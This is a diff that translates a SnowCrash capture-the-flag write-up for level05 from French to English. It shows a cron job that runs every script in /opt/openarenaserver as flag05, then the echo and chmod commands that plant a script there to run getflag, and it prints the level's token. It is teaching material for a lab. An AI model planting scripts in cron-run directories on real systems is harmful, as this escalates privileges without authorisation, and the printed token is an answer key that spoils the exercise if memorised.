@@ -1,27 +1,29 @@
 # level05
 
-1) Information reçue a la connexion
+1. Files found in `~/` : none
+
+- Information received at connection :
 
 ```bash
 You have new mail.
 ```
 
-2) Analyse de la mailbox
+2. Mailbox analysis
 
 ```bash
 level05@SnowCrash:~$ ls -l /var/mail/level05
 -rw-r--r--+ 1 root mail 58 Oct 7 08:14 /var/mail/level05
 ```
 
-* Le mailbox de `level05` contient une entrée cron indiquant que `/usr/sbin/openarenaserver` est exécuté toutes les 2 minutes en tant que l'utilisateur `flag05`.
+The `level05` mailbox contains a cron entry indicating that `/usr/sbin/openarenaserver` is executed every 2 minutes as user `flag05`.
+
 ```bash
 level05@SnowCrash:~$ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-* On verifie Le binaire `/usr/sbin/openarenaserver`
+Verification of the `/usr/sbin/openarenaserver` binary :
 
-Il exécute **tous** les scripts présents dans `/opt/openarenaserver/` puis supprime chaque script après exécution.
 ```bash
 level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
 #!/bin/sh
@@ -31,17 +33,24 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
-3) Exploitation pour récupérer le token :
+It executes **all** scripts present in `/opt/openarenaserver/` then deletes each script after execution.
 
-* On crée `/opt/openarenaserver/script.sh` contenant `getflag > /tmp/token` et rends le fichier exécutable.
+3. Exploitation
 
-Lors de la prochaine exécution du service, `getflag` a été lancé en tant que `flag05` et a écrit le token dans `/tmp/token`.
+Create `/opt/openarenaserver/script.sh` containing `getflag > /tmp/token` and make the file executable :
+
+```bash
+echo 'getflag > /tmp/token' > /opt/openarenaserver/script.sh
+chmod +x /opt/openarenaserver/script.sh
+```
+
+During the next service execution, `getflag` was launched as `flag05` and wrote the token to `/tmp/token`.
 
 ```bash
 level05@SnowCrash:/$ cat /tmp/token
-Check flag.Here is your token : ...
+Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
-4) Token découvert :
+4. Token discovered
 
-Le token est `viuaaale9huek52boumoomioc`.
+The token is : `viuaaale9huek52boumoomioc`
